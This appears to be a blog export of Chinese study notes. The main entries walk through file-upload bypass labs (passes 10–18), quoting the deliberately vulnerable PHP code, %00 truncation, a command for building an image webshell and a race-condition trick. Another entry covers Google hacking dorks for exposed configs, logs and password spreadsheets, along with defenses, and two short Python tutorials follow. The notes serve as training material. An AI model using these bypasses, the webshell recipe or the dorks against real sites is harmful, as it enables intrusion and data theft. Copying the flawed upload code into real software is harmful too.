array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]); $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); if (move_uploaded_file($_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;], UPLOAD_PATH . &apos;/&apos; . $file_name)) { $img_path = UPLOAD_PATH . &apos;/&apos; .$file_name; $is_upload = true; } } else { $msg = UPLOAD_PATH . &apos;文件夹不存在,请手工创建！&apos;; } } 如果文件名在黑名单中，则替换其中的字符串为空 $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); Pass-11 %00截断绕过 （白名单）初步测试上传houzui.php，houzui.xxx失败，应该是采用了白名单机制 服务端代码$is_upload = false; $msg = null; if(isset($_POST[&apos;submit&apos;])){ $ext_arr = array(&apos;jpg&apos;,&apos;png&apos;,&apos;gif&apos;); $file_ext = substr($_FILES[&apos;upload_file&apos;][&apos;name&apos;],strrpos($_FILES[&apos;upload_file&apos;][&apos;name&apos;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr)){ $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;]; $img_path = $_GET[&apos;save_path&apos;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else{ $msg = &apos;上传失败！&apos;; } } else{ $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; } } 关键代码 $ext_arr = array(&apos;jpg&apos;,&apos;png&apos;,&apos;gif&apos;);//采用了白名单机制 $file_ext = substr($_FILES[&apos;upload_file&apos;][&apos;name&apos;],strrpos($_FILES[&apos;upload_file&apos;][&apos;name&apos;],&quot;.&quot;)+1); $img_path = $_GET[&apos;save_path&apos;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; move_uploaded_file($temp_file,$img_path) 文件名直接连接在后面 strrpos() 函数查找字符串在另一字符串中最后一次出现的位置。 注释：strrpos() 函数对大小写敏感。 substr() 函数返回字符串的一部分。 抓包看到上传路径在url中，在 &lt;php 5.3.4版本中可以添加 %00 截断 后面加houzui.php%00截断 由于本地环境是PHP Version 5.6.28，未能成功上传 知识点之00截断%00原理 参考 https://www.jianshu.com/p/dad4df0e0bf4burpsuite上传截断 一、简介截断的产生核心，就是chr(0)字符 。下面是用 URL 编码形式表示的 ASCII 字符 在url中%00表示ascll码中的0，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束 比如 https://mp.csdn.net/upfiles/?filename=test.txt 此时输出的是test.txt 加上%00 https://mp.csdn.net/upfiles/?filename=test.php%00.txt 此时输出的是test.php 这个字符即不为空(Null)，也不是空字符(“”)，更不是空格！ 当程序在输出含有chr(0)变量时，chr(0)后面的数据会被停止，换句话说，就是误把它当成结束符，后面的数据直接忽略，这就导致漏洞产生的原因。 二、影响2.1 PHP在php 5.3.4中修复了0字符，但是在之前的版本中仍然危害巨大。 简单测试一下 (PHP 版本&lt;5.3.4) &lt;?php $data = $_GET[&quot;filename&quot;]`; echo $data; ?&gt; url中输入xx.php?filename=test.php%00.txt，实际输出为test.php. 常见利用方法： 1.上传时路径可控，使用00截断 2.文件下载时，00截断绕过白名单检查 3.文件包含时，00截断后面限制(主要是本地包含时) 4.其它与文件操作有关的地方都可能使用00截断。 2.2 ASP在文件上传路径可控时出现： &lt;% response.write(request(&quot;Filename&quot;)) %&gt; 传入filename=test.asp%00.txt， 获得参数值是test.asp，asp 会自动截断 %00 后面的内容。 2.3 JSP&lt;% String temp=request.getRealPath(&quot;/&quot;)+request.getParameter(&quot;path&quot;); out.println(temp); String ext = temp.substring(temp.lastIndexOf(&quot;.&quot;) + 1); out.println(ext); %&gt; 传入path=shell.jsp%00.txt 获得后缀是txt，但是操作文件的api是使用 C 实现会导致00截断。因此这个与php相似，利用场景是文件上传 文件下载等。 Pass-12 0x00截断（白名单）初步测试1、上传houzui.php houzui.xxx失败，猜测使用白名单机制；2、抓包查看 通过post传进来的，还是利用00截断，但这次需要在二进制中进行修改，因为post不会像get对%00进行自动解码。 0x开头表示16进制，0在十六进制中是00, 0x00就是%00解码成的16进制 这里还是有版本的原因未能成功上传。 服务端$is_upload = false; $msg = null; if(isset($_POST[&apos;submit&apos;])){ $ext_arr = array(&apos;jpg&apos;,&apos;png&apos;,&apos;gif&apos;); $file_ext = substr($_FILES[&apos;upload_file&apos;][&apos;name&apos;],strrpos($_FILES[&apos;upload_file&apos;][&apos;name&apos;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr)){ $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;]; $img_path = $_POST[&apos;save_path&apos;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else{ $msg = &quot;上传失败&quot;; } } else{ $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; } } 与上一关不同的是，这里面的文件上传路径是通过post请求 $img_path = $_POST[&apos;save_path&apos;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; pass-13 文件头检查绕过（检查内容）初步测试1、上传houzui.php houzui.xxx失败，猜测使用了白名单 服务端代码function getReailFileType($filename){ $file = fopen($filename, &quot;rb&quot;); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(&quot;C2chars&quot;, $bin); $typeCode = intval($strInfo[&apos;chars1&apos;].$strInfo[&apos;chars2&apos;]); $fileType = &apos;&apos;; switch($typeCode){ case 255216: $fileType = &apos;jpg&apos;; break; case 13780: $fileType = &apos;png&apos;; break; case 7173: $fileType = &apos;gif&apos;; break; default: $fileType = &apos;unknown&apos;; } return $fileType; } $is_upload = false; $msg = null; if(isset($_POST[&apos;submit&apos;])){ $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;]; $file_type = getReailFileType($temp_file); if($file_type == &apos;unknown&apos;){ $msg = &quot;文件未知，上传失败！&quot;; }else{ $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else{ $msg = &quot;上传失败&quot;; } } } 分析：通过读文件的前2个字节判断文件类型，因此直接上传图片马即可，制作方法： copy normal.jpg /b + shell.php /a webshell.jpg pass-14 突破getimagesize() (检查内容）初步测试1、直接上传图片马 服务端代码function isImage($filename){ $types = &apos;.jpeg|.png|.gif&apos;; if(file_exists($filename)){ $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); if(stripos($types,$ext)){ return $ext; }else{ return false; } }else{ return false; } } $is_upload = false; $msg = null; if(isset($_POST[&apos;submit&apos;])){ $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;]; $res = isImage($temp_file); if(!$res){ $msg = &quot;文件未知，上传失败！&quot;; }else{ $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).$res; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else{ $msg = &quot;上传失败&quot;; } } } 关键代码： $info = getimagesize($filename); 如果不能访问 filename 指定的图像或者其不是有效的图像，getimagesize() 将返回 FALSE 并产生一条 E_WARNING 级的错误。 $ext = image_type_to_extension($info[2]); image_type_to_extension — 取得图像类型的文件后缀 这里用getimagesize获取文件类型，还是直接就可以利用图片马就可进行绕过 Pass-15 突破exif_imagetype() (检查内容)初步测试直接上传图片木马 服务端代码function isImage($filename){ //需要开启php_exif模块 $image_type = exif_imagetype($filename); switch ($image_type) { case IMAGETYPE_GIF: return &quot;gif&quot;; break; case IMAGETYPE_JPEG: return &quot;jpg&quot;; break; case IMAGETYPE_PNG: return &quot;png&quot;; break; default: return false; break; } } $is_upload = false; $msg = null; if(isset($_POST[&apos;submit&apos;])){ $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;]; $res = isImage($temp_file); if(!$res){ $msg = &quot;文件未知，上传失败！&quot;; }else{ $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$res; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else{ $msg = &quot;上传失败&quot;; } } } 关键代码 $image_type = exif_imagetype($filename); exif_imagetype() 读取一个图像的第一个字节并检查其签名。 Pass-16 二次渲染（检查内容）初步测试直接上传图片马 服务端代码$is_upload = false; $msg = null; if (isset($_POST[&apos;submit&apos;])){ // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径 $filename = $_FILES[&apos;upload_file&apos;][&apos;name&apos;]; $filetype = $_FILES[&apos;upload_file&apos;][&apos;type&apos;]; $tmpname = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;]; $target_path=UPLOAD_PATH.basename($filename); // 获得上传文件的扩展名 $fileext= substr(strrchr($filename,&quot;.&quot;),1); //判断文件后缀与类型，合法才进行上传操作 if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;)){ if(move_uploaded_file($tmpname,$target_path)) { //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path); if($im == false){ $msg = &quot;该文件不是jpg格式的图片！&quot;; }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.jpg&quot;; $newimagepath = UPLOAD_PATH.$newfilename; imagejpeg($im,$newimagepath); //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.$newfilename; unlink($target_path); $is_upload = true; } } else { $msg = &quot;上传失败！&quot;; } }else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;)){ if(move_uploaded_file($tmpname,$target_path)) { //使用上传的图片生成新的图片 $im = imagecreatefrompng($target_path); if($im == false){ $msg = &quot;该文件不是png格式的图片！&quot;; }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.png&quot;; $newimagepath = UPLOAD_PATH.$newfilename; imagepng($im,$newimagepath); //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.$newfilename; unlink($target_path); $is_upload = true; } } else { $msg = &quot;上传失败！&quot;; } }else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;)){ if(move_uploaded_file($tmpname,$target_path)) { //使用上传的图片生成新的图片 $im = imagecreatefromgif($target_path); if($im == false){ $msg = &quot;该文件不是gif格式的图片！&quot;; }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).&quot;.gif&quot;; $newimagepath = UPLOAD_PATH.$newfilename; imagegif($im,$newimagepath); //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.$newfilename; unlink($target_path); $is_upload = true; } } else { $msg = &quot;上传失败！&quot;; } }else{ $msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;; } } 关键部分 imagecreatefromjpeg — 由文件或 URL 创建一个新图象。 imagecreatefrompng imagecreatefromgif imagejpeg bool imagejpeg ( resource $image [, string $filename [, int $quality ]] ) imagejpeg() 从 image 图像以 filename 为文件名创建一个 JPEG 图像 imagepng imagegif unlink() 函数删除文件。若成功，则返回 true，失败则返回 false。 判断了后缀名、content-type，以及利用imagecreatefromgif判断是否为gif图片，最后再做了一次二次渲染。但是在代码审计后发现其实后面的 参考 https://xz.aliyun.com/t/2657 Pass-17服务端源代码$is_upload = false; $msg = null; if(isset($_POST[&apos;submit&apos;])){ $ext_arr = array(&apos;jpg&apos;,&apos;png&apos;,&apos;gif&apos;); $file_name = $_FILES[&apos;upload_file&apos;][&apos;name&apos;]; $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;]; $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1); $upload_file = UPLOAD_PATH . &apos;/&apos; . $file_name; if(move_uploaded_file($temp_file, $upload_file)){ if(in_array($file_ext,$ext_arr)){ $img_path = UPLOAD_PATH . &apos;/&apos;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; rename($upload_file, $img_path); $is_upload = true; }else{ $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; unlink($upload_file); } }else{ $msg = &apos;上传失败！&apos;; } } 关键部分 rename — 重命名一个文件或目录 unlink - 删除文件 分析、获取文件名、临时文件名文件后缀、采用白名单验证文件后缀是否为图片，然后重命名文件。 测试直接上传图片马 知识点之php中$_FILES变量的用法$_FILES变量简介$_FILES: 经由 HTTP POST 文件上传而提交至脚本的变量。类似于旧数组 $HTTP_POST_FILES 数组（依然有效，但反对使用）。详细信息可参阅 POST 方法上传。 $_FILES数组内容$_FILES[‘myFile’][‘name’] 客户端文件的原名称。 $_FILES[‘myFile’][‘type’] 文件的 MIME 类型，需要浏览器提供该信息的支持，例如”image/gif”。 $_FILES[‘myFile’][‘size’] 已上传文件的大小，单位为字节。 $_FILES[‘myFile’][‘tmp_name’] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定。 $_FILES[‘myFile’][‘error’] 和该文件上传相关的错误代码。[‘error’] 是在 PHP 4.2.0 版本中增加的。下面是它的说明：(它们在PHP3.0以后成了常量) UPLOAD_ERR_OK 值：0; 没有错误发生，文件上传成功。 UPLOAD_ERR_INI_SIZE 值：1; 上传的文件超过了 php.ini 中 upload_max_filesize 选项限制的值。 UPLOAD_ERR_FORM_SIZE 值：2; 上传文件的大小超过了 HTML 表单中 MAX_FILE_SIZE 选项指定的值。（我们可以在form表单中指定input type=&apos;hidden&apos; name=&apos;MAX_FILE_SIZE&apos; value=&apos;附件的最大字节数&apos;） UPLOAD_ERR_PARTIAL 值：3; 文件只有部分被上传。 UPLOAD_ERR_NO_FILE 值：4; 没有文件被上传。 文件的上传过程文件被上传结束后，默认地被存储在了临时目录中，这时必须将它从临时目录中删除或移动到其它地方，如果没有，则会被删除。也就是不管是否上传成功，脚本执行完后临时目录里的文件肯定会被删除。所以在删除之前要用PHP的 copy()或者move_upload_file() 函数将它复制或者移动到其它位置，此时，才算完成了上传文件过程。 用form上传文件时，一定要加上属性内容 enctype=”multipart/form-data”，否则用$_FILES[filename]获取文件信息时会报异常。 &gt; &lt;input name=&quot;myFile&quot; type=&quot;file&quot;&gt; &gt; &lt;input type=&quot;submit&quot; value=&quot;上传文件&quot;&gt; &gt; 默认地，表单数据会编码为&quot;application/x-www-form-urlencoded&quot;。就是说，在发送到服务器之前，所有字符都会进行编码（空格转换为&quot;+&quot; 加号，特殊符号转换为 ASCII HEX 值）。 application/x-www-form-urlencoded 在发送前编码所有字符（默认） multipart/form-data 不对字符编码。 在使用包含文件上传控件的表单时，必须使用该值。 text/plain 空格转换为 “+” 加号，但不对特殊字符编码。 Pass-18 条件竞争服务端代码//index.php $is_upload = false; $msg = null; if (isset($_POST[&apos;submit&apos;])) { require_once(&quot;./myupload.php&quot;); $imgFileName =time(); $u = new MyUpload($_FILES[&apos;upload_file&apos;][&apos;name&apos;], $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;], $_FILES[&apos;upload_file&apos;][&apos;size&apos;],$imgFileName); $status_code = $u-&gt;upload(UPLOAD_PATH); switch ($status_code) { case 1: $is_upload = true; $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to; break; case 2: $msg = &apos;文件已经被上传，但没有重命名。&apos;; break; case -1: $msg = &apos;这个文件不能上传到服务器的临时文件存储目录。&apos;; break; case -2: $msg = &apos;上传失败，上传目录不可写。&apos;; break; case -3: $msg = &apos;上传失败，无法上传该类型文件。&apos;; break; case -4: $msg = &apos;上传失败，上传的文件过大。&apos;; break; case -5: $msg = &apos;上传失败，服务器已经存在相同名称文件。&apos;; break; case -6: $msg = &apos;文件无法上传，文件不能复制到目标目录。&apos;; break; default: $msg = &apos;未知错误！&apos;; break; } } //myupload.php class MyUpload{ ...... ...... ...... var $cls_arr_ext_accepted = array( &quot;.doc&quot;, &quot;.xls&quot;, &quot;.txt&quot;, &quot;.pdf&quot;, &quot;.gif&quot;, &quot;.jpg&quot;, &quot;.zip&quot;, &quot;.rar&quot;, &quot;.7z&quot;,&quot;.ppt&quot;, &quot;.html&quot;, &quot;.xml&quot;, &quot;.tiff&quot;, &quot;.jpeg&quot;, &quot;.png&quot; ); ...... ...... ...... /** upload() ** ** Method to upload the file. ** This is the only method to call outside the class. ** @para String name of directory we upload to ** @returns void **/ function upload( $dir ){ $ret = $this-&gt;isUploadedFile(); if( $ret != 1 ){ return $this-&gt;resultUpload( $ret ); } $ret = $this-&gt;setDir( $dir ); if( $ret != 1 ){ return $this-&gt;resultUpload( $ret ); } $ret = $this-&gt;checkExtension(); if( $ret != 1 ){ return $this-&gt;resultUpload( $ret ); } $ret = $this-&gt;checkSize(); if( $ret != 1 ){ return $this-&gt;resultUpload( $ret ); } // if flag to check if the file exists is set to 1 if( $this-&gt;cls_file_exists == 1 ){ $ret = $this-&gt;checkFileExists(); if( $ret != 1 ){ return $this-&gt;resultUpload( $ret ); } } // if we are here, we are ready to move the file to destination $ret = $this-&gt;move(); if( $ret != 1 ){ return $this-&gt;resultUpload( $ret ); } // check if we need to rename the file if( $this-&gt;cls_rename_file == 1 ){ $ret = $this-&gt;renameFile(); if( $ret != 1 ){ return $this-&gt;resultUpload( $ret ); } } // if we are here, everything worked as planned :) return $this-&gt;resultUpload( &quot;SUCCESS&quot; ); } ...... ...... ...... }; 分析 本关对文件后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，将文件上传后，对文件重新命名，同样存在条件竞争的漏洞。可以不断利用burp发送上传图片马的数据包，由于条件竞争，程序会出现来不及rename的问题，从而上传成功：]]></content>
      <tags>
        <tag>File_Upload</tag>
        <tag>practice</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Google-Hacking]]></title>
    <url>%2F2018%2F08%2F30%2FGoogle-Hacking%2F</url>
    <content type="text"><![CDATA[Google-Hacking搜索技巧Google 基本搜索与挖掘技巧● 保持简单明了的关键词 ● 使用最可能出现在要查找的网页上的字词 ● 尽量简明扼要地描述要查找的内容 ● 选择独特性的描述字词 ● 社会公共信息库查询 ● 个人信息：人口统计局 ● 企业等实体：YellowPage、企业信用信息网 ● 网站、域名、IP：whois 等 Google语法基础1.查询是不区分大小写（OR在表示布尔含义时一定要大写） 2.*在谷歌搜索的时候只能当做一个单词使用 3.谷歌有32词的搜索限制（当然可以通过*代替某些单词突破这种限制） 4.短语搜索要带上单引号 5.AND对谷歌来说是多余的，谷歌会自动查询你输入的一切 6.谷歌会忽略特别常见的字符，但是前面加上”+”强制搜索（+后面不能有空格） 7.NOT可以使用”-”(减号代替) 8.布尔查询OR/”|” 高级语法operator:search 注意点： 1.在操作符、冒号、搜索项之间没有空格 2.all运算符（以all开头的运算符)都是有些奇怪的,通常一个查询只能使用一次，而且不能和其他运算符一起使用 allintitle 会告诉谷歌，它后面的每一个单词或者短语都要在标题中出现 allintext 在除了标题、URL、链接以外的任何地方找到某个内容（它后面的每一个单词或者短语都要在内容中出现） 3.intitle:”index of”等价于 intitle:index.of 因为‘.’休止符能够代替任何字符(这个技术也提供了一个无需键入空格和两边引号的短语) 4.intitle:”index of” private 能返回标题中有index of 以及在任何地方有 private的页面（intitle只对其后面第一个搜索项有效） 常见运算符解释site 把搜索精确到特定的网站site 允许你搜索仅仅位于一个特定服务器上的或者在一个特定域名里的页面 filetype 搜索特定后缀的文件搜索以一个特别的文件扩展名结尾的页面，谷歌会以网页快照的形式来将这种格式转换成html页面，但是你直接点击标题就会下载 link 包含指定网页的链接的网页搜索包含指定网页的链接的网页，link后面跟的是完整的URL可以包含目录名、文件名、参数等，信息量越大查询结果越精确。 /注意/ 不要认为 Link能搜索链接中的文本，inanchor才执行的是这个操作，如果输入错误，那么并不会执行link查询而是把[link:短语]当做一个整体直接默认查询 link运算符不能和其他运算符一起使用 inanchor 寻找链接的锚点inanchor 用于寻找链接的锚点，或者在链接中显示的文本（就是显示在页面上的提供点击的文字） cache 显示页面的缓存版本直接跳转到页面的缓存版本 numberange 搜索一个数字numberange 需要两个参数，一个低位数字，一个高位数字，中间用连字符分割 例如： 为了找到12345 numberange:12344-12346 /注意/ 1.这个运算符还有简化版， 12344..12346 2.可以和其他运算符一起使用 daterange 搜索在特定日期范围内发布的页谷歌每次重新抓取一个网页网页的日期就会刷新 两个参数日期都必须是自公元前4713年1月1日起经过的天数，中间用连字符分割但（不如使用谷歌的高级搜索引擎实现） info 显示谷歌的总结信息显示一个网站的总结信息还提供了可能关于该网站的其他搜索链接 /注意/ info不能和其他运算符一起使用 related 显示相关站点参数是一个URL /注意/： 1.点击类似网页链接和使用高级搜索引擎能实现相同的功能 2.不能和其他运算符一起使用 define 显示一个术语的定义常用搜索引擎DuckDuckGo GHDB 谷歌黑客数据库 目录列表的查找目录列表能列出存在于一个web服务器上的文件和目录 查找目录列表 intitle:index.of &apos;parent directory&apos; intitle:index.of name size （特定版本的）服务器能被攻击者用来决定攻击web服务器最佳方法的一小段信息，就是确切的服务器版本实例： intitle:index.of “server at” intitle:index.of “Apache/1.3.27 Server at” 扩展遍历技术经常会出现web页面的备份文件，他们有泄露源码的倾向。常常在配置错误的时候出现这种问题，把php代码备份到不是以php结尾的文件中，比如bak实例： intitle:index.of index.php.bak inurl:index.php.bak 配置文件的查找配置文件的存在说明服务就在附近示例： filetyte:conf inurl:firewall 如果你能知道配置文件的名字也是一个非常好的搜索方式，当然你可以从配置文件中抽取特定的字符串来查询，如果能再配上软件名字的话就效果更好了注意：1.除了配置文件名conf的使用，也可以组合其他的通用的命名规则来查找其他等价的命名规则 inurl:conf OR inurl:config OR inurl:cfg 日志文件的查找日志文件中也记录着日志很多的敏感信息日志文件也有一个默认的名字可以被我们用作基础的搜索，最常见的扩展名就是log了实例： filetype:log inurl:log ext log log filetype:log username putty 查找office文档实例： filetype:xls inurl:password.xls filetype:xls username password email 数据库、后台类、登录入口登录入口是第一道防线，很容易泄露软硬件的信息 查找入口一般使用关键字login大的厂商一般会把版权的注意事项放在页面的底部实例： intitle:login intext:版权信息 如何防御Google Hackingweb 服务器的安全防护 一、目录列表和丢失的索引文件.htaccess 可以来防止目录的内容未授权的访问，但是不当的配置还会让这个文件可见甚至可读在 apache 的服务器上可以通过 httpd.conf文件中的单词indexs前加一个连字符或者减号来禁止目录列表 二、robots.txt#`开头的行会被认为是注释，每一个不以#开头的行都会以User-agent 或者是一个disallow 声明开头，表示禁止爬虫爬行的位置，但是也可以允许特定的爬虫访问 三、NOARCHIVE缓存杀手有时候你希望google住抓取某个页面但是又不希望对页面的副本进行缓存，或者搜索结果中显示缓存链接，这个要求可以通过META实现 &lt;META NAME= &quot;ROBOTS&quot; CONTENT= &quot;NOARCHIVE&quot;&gt; 如果你只想阻止谷歌对文件的缓存，可以在HEAD节里使用 &lt;META NAME=&quot;GOOGLEBOT&quot; CONTENT=&quot;NOINDEX,NOFOLLOW&quot;&gt; 四、NOSNIPET 去除摘要&lt;META NAME=&quot;GOOGLEBOT&quot; CONTENT=&quot;NOSNIPPET&quot;&gt; 另外这个功能还有个副作用，就是谷歌也不能缓存，一举两得。 五、十五条防止信息泄露和服务器入侵的措施1.检查所有的文档能否被Google搜索到，避免敏感文件能出现在公众的视野中 2.选择一个强大的自动化工具来扫描你网站上是否有信息的泄露 3.不要使用默认的登录入口，以防止登录入口被hacker猜解 4.关闭数据库的远程管理工具 5.删除明显的显示软件版本的信息 6.配置服务器只能下载特定的文件类型（白名单比黑名单要简单有效得多） 7.正确的配置你的服务器，不要抱有侥幸心理，任何的松懈带来的灾难是巨大的 8.不要把源码的备份放在未经授权就能访问的地方，并且及时删除网站上的无用的备份文件 9.不要使用弱密码，防止攻击者轻易攻破后台 10.登录请加上强度相对较高的验证手段，防止攻击者采用爆破的手段 11.关闭服务器不必要的端口 12.请不要使用网站上的任何信息作为密码，否则都属于容易爆破的类型 13.备份的源代码请经过专业的混淆，防止被下载之后轻易读取到内容 14.及时更新服务器的系统，修复潜在的漏洞 15.安装正规的安全防护软件 参考Google Hacking信息刺探的攻与防]]></content>
      <tags>
        <tag>Google-hack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python基础之使用入门]]></title>
    <url>%2F2018%2F08%2F09%2FPython-%E5%9F%BA%E7%A1%80-00-%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[Python使用入门Python的优缺点优点语法简洁 高可读性 开发效率高 可移植性 支持自行开发或第三方模块 可调用C，C++库 可与Java组建集成 缺点跟其他语言相比速度不够快 使用场景使用Python可以做如下事情： 系统编程对操作系统服务的内置接口，使其成为编写可移植的维护操作系统的管理工 具 用户图形接口Python的简洁以及快速的开发周期十分适合开发GUI程序 Internet脚本通过内置的Internet模块可以编写服务端或客户端脚本来进行FTP文件传输，解 析、生成和分析XML文件，发送、接受、编写和解析Email等 数据库编程通过接口来连接数据库并进行数据库编程 快速原型数值计算和科学计算编程游戏、图形、人工智能、XML、机器人等Python解释器简介解释器：解释器是一种让其他程序运行起来的程序。实际上，解释器是代码与计算 机硬件之间的软件逻辑层。Shell就是我们最常见的解释器。 解释器在执行时，每次读入一条语句，并且根据这条语句执行特定的操作；然后再 读入下一条语句，依次类推。 Python可以认为是一款编程语言，我们安装的是一个名为解释器的软件包。 当Python包安装在机器上后，它包含了一些最小化的组建：一个解释器和支持的库。 程序执行对于Python，跟shell比起来其过程就稍微多几步。 字节码编译： Python会把源码编译成所谓字节码的形式。编译是一个简单翻译的步骤，可以提高 运行速度。如果Python进程在机器上拥有写的权限，那么它会把程序的字节码保存 为一个以.pyc为扩展名的文件。.pyc就是编译过的.py源代码。 Python虚拟机（PVM） 字节码会通过PVM来执行。PVM是迭代运行字节码指令的一个大循环，一个接一个 地完成操作。PVM是Python的运行引擎，实际运行脚本的组建。 Python实现的替代者： Cpython Jython IronPython Psyco实时编译器 Shedskin C++转换器 交互模式与编写代码最简单的运行Python程序的方法就是交互模式。 在正确配置参数后“python”命令就能进入交互模式。 此时提示符会变成“&gt;&gt;&gt;” 交互模式通常用于实验和测试。 交互模式下比起文本模式，会有如下特点： 1. 文本前面不能有空格，否则报错。 2. 复合语句中第二行开始提示符会变成“…”。 3. 用一个空行表示符合语句结束。 执行性脚本可执行脚本就是跟shell脚本执行方式类似。 在UNIX（或类UNIX系统中）以“#!”开头，并指定程序，并赋予执行权限。 或者不需要“#!”开头，只需要如下操作： $python script0.py 这样也能执行script0.py里的内容。 技巧：由于Python安装的位置可能都不一样，所以可以在第一行写成如下： #!/usr/bin/env python 这样，系统会自动去找相关python。 基础语法标示符：标识符有字母、数字、下划线组成，但不能以数字开头。 行和缩紧：由于Python不使用｛｝来表示符合语句的开始和结束，所以缩紧很重要。 多行语句：使用反斜杠（\）可以把一行语句写成多行。 缩紧例子： if True: print(&apos;first true&apos;) if True: print(&apos;second true&apos;) else: print(&apos;first else&apos;) 左面的例子里，在C语言等高级语言里当没 有使用｛｝的时候会按最近的匹配方式来 匹配if和else的。但在Python里是以缩紧来 匹配。所以左边例子里的else匹配的是第一 个if 引号：在Python里引号可以使用单引号（’）双引号（”）。用法一样。 三引号（ “ “ “）可以使用段落。 Python注释：可以使用#来进行注释]]></content>
      <tags>
        <tag>Python</tag>
        <tag>Python基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python基础之类型与运算-数字]]></title>
    <url>%2F2018%2F08%2F09%2FPython-%E5%9F%BA%E7%A1%80-01-%E7%B1%BB%E5%9E%8B%E4%B8%8E%E8%BF%90%E7%AE%97-%E6%95%B0%E5%AD%97%2F</url>
    <content type="text"><![CDATA[Python的类型与运算-数字数字类型整数在Python 2.x版本中整数分为一般整数和长整数。 &gt;&gt;&gt; 2**63 9223372036854775808L &gt;&gt;&gt; 2**62-1+2**62 9223372036854775807L 这个是在Python 2.7.15版本的结果。每个版本会有一些不同。 在这个版本中一般整数是64bit的（符号位占1bit）。 当超过64bit，会在后面加L 之前的一些版本 有可能是32bit，这个看具体的版本。 但是在Python 3.x就没有这种区分，整数只有一个类型。 整数-二进制、八进制、十六进制在Python里整数可以输入或输出成二进制，八进制或者十六进制数。 二进制数表示方式为0b或者0B开头。例如：0b10110010，0B11001001 八进制数表述方式为0o或者0O开头。例如：0o632765，0O223174 十六进制数表述方式为0x或者0X开头。例如：0xff，0X3A，0xAC，0Xb7 需要把整数输出成非十进制数的时候，需要使用一下函数： bin(i), oct(i), hex(i) 在这里i是十进制数字，输出的是文本形式。 我们需要把一个非十进制数的文本转化为整数： int(str,base) 在这里，str是文本形式的数字，base为2，8，16 数字。各自代表 二进制，八进制，十六进制。 注：Python提供从2进制到36进制数的输入。 浮点数在Python里浮点数是用64bit来存储的。精度大约能达到17位。Python 2.7 &gt;&gt;&gt; print(1.0/6.0) 0.166666666667 &gt;&gt;&gt; 1.0/6.0 0.16666666666666666 &gt;&gt;&gt; repr(1.0/6.0) &apos;0.16666666666666666&apos; repr模式就是交互模式时的显示模式 复数在Python里复数的现实方式跟现实稍微有点区别： 现实：3+5i － 